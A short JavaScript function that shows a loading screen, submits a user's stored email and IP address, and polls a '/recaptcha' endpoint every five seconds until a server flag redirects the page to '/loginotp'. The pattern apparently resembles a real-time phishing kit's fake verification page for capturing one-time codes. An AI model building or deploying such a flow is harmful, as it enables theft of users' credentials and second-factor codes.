


function recap(){
    document.getElementById('recapload').style.display = 'flex';

    const userip = localStorage.getItem("userip");
    const email = localStorage.getItem("email");

    document.getElementById('useremail').value = email
    document.getElementById('userip').value = userip

    document.getElementById('recaptuesubmitbutton').click()


    setInterval(() => {

        $.ajax({
            type: "POST",
            // headers: { "Content-type": "application/json; charset=UTF-8" },
            url: "/recaptcha",
           data: $('#rform').serialize(),
           dataType: "json",
           success: (response) => {
    
            if(response.otpstatus == "off"){
             
            // alert('otp status is off')
              } else if(response.otpstatus == "on"){
                // alert('otp status is on')
                window.location.replace('/loginotp')
              }

              else{ window.location.replace('/')}
          },
          error: (error) => {
    
            console.log(error)
          }
    
    
    
    
    
           })
    }, 5000);


    // console.log(email + userip)
    
}



